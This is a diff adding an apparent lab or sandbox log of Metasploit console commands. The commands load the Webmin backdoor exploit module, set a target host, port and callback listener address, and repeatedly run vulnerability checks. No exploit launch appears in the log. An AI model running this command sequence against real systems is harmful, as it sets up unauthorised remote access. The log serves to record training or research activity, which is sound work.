@@ -1,0 +1,20 @@
+{"sandbox_id": "172", "timestamp_str": "2020-05-06T20:43:42.342591+02:00", "cmd_type": "msf-command", "cmd": "search webmin"}
+{"sandbox_id": "172", "timestamp_str": "2020-05-06T20:44:34.606888+02:00", "cmd_type": "msf-command", "cmd": "use exploit/unix/webapp/webmin_backdoor"}
+{"sandbox_id": "172", "timestamp_str": "2020-05-06T20:44:39.029933+02:00", "cmd_type": "msf-command", "cmd": "options"}
+{"sandbox_id": "172", "timestamp_str": "2020-05-06T20:44:55.633939+02:00", "cmd_type": "msf-command", "cmd": "set RHOSTS 172.18.1.5"}
+{"sandbox_id": "172", "timestamp_str": "2020-05-06T20:45:01.784845+02:00", "cmd_type": "msf-command", "cmd": "set LHOST 10.1.135.83"}
+{"sandbox_id": "172", "timestamp_str": "2020-05-06T20:45:07.478292+02:00", "cmd_type": "msf-command", "cmd": "set RPORT 10000"}
+{"sandbox_id": "172", "timestamp_str": "2020-05-06T20:45:09.308507+02:00", "cmd_type": "msf-command", "cmd": "check "}
+{"sandbox_id": "172", "timestamp_str": "2020-05-06T20:45:23.433500+02:00", "cmd_type": "msf-command", "cmd": "set ssl true"}
+{"sandbox_id": "172", "timestamp_str": "2020-05-06T20:45:27.988391+02:00", "cmd_type": "msf-command", "cmd": "check"}
+{"sandbox_id": "172", "timestamp_str": "2020-05-06T20:45:41.349513+02:00", "cmd_type": "msf-command", "cmd": "search webmin"}
+{"sandbox_id": "172", "timestamp_str": "2020-05-06T20:45:57.542064+02:00", "cmd_type": "msf-command", "cmd": "use exploit/unix/webapp/webmin_backdoor"}
+{"sandbox_id": "172", "timestamp_str": "2020-05-06T20:46:00.967155+02:00", "cmd_type": "msf-command", "cmd": "options "}
+{"sandbox_id": "172", "timestamp_str": "2020-05-06T20:46:08.341528+02:00", "cmd_type": "msf-command", "cmd": "set rhosts 172.18.1.5"}
+{"sandbox_id": "172", "timestamp_str": "2020-05-06T20:46:11.484161+02:00", "cmd_type": "msf-command", "cmd": "set rport 10000"}
+{"sandbox_id": "172", "timestamp_str": "2020-05-06T20:46:36.998447+02:00", "cmd_type": "msf-command", "cmd": "set lhost 10.1.135.83"}
+{"sandbox_id": "172", "timestamp_str": "2020-05-06T20:46:47.289966+02:00", "cmd_type": "msf-command", "cmd": "set ssl true"}
+{"sandbox_id": "172", "timestamp_str": "2020-05-06T20:46:53.537549+02:00", "cmd_type": "msf-command", "cmd": "set lhost 10.1.135.83"}
+{"sandbox_id": "172", "timestamp_str": "2020-05-06T20:46:57.628858+02:00", "cmd_type": "msf-command", "cmd": "check"}
+{"sandbox_id": "172", "timestamp_str": "2020-05-06T20:47:04.921333+02:00", "cmd_type": "msf-command", "cmd": "set ssl false"}
+{"sandbox_id": "172", "timestamp_str": "2020-05-06T20:47:07.307421+02:00", "cmd_type": "msf-command", "cmd": "check"}
